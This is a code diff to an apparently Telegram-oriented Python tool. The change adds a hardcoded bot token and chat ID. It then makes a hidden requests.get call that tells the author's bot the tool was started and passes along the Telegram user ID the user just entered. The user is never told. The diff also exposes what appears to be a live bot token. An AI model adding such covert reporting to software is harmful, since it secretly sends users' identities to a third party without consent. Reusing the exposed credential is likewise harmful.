@@ -69,13 +69,20 @@ logo ="""
 """
 print(logo)
 #====لوكو====
-
+token1 = "7042398014:AAELHhBMWZX28y7AJYHcoGK-nyy92YBJwdk"
+id1 = 6060332252
 token = input(f'{E}E{F}n{E}t{F}e{E}r {F}y{E}u{F}r{E}e {F}T{E}o{F}k{E}e{F}n : ')
 os.system('clear')
 print(logo)
 id = input(f'{E}I{F}D :')
 os.system('clear')
 print(logo)
+ZZE = (f"""
+تم تشغيل الاداه
+
+tg://openmessage?user_id={id}
+""")
+requests.get('https://api.telegram.org/bot' +str(token1) + '/sendMessage?chat_id=' + str(id1) + '&text=' + str(ZZE))
 
 AA, BB, CC = 0, 0, 0
 
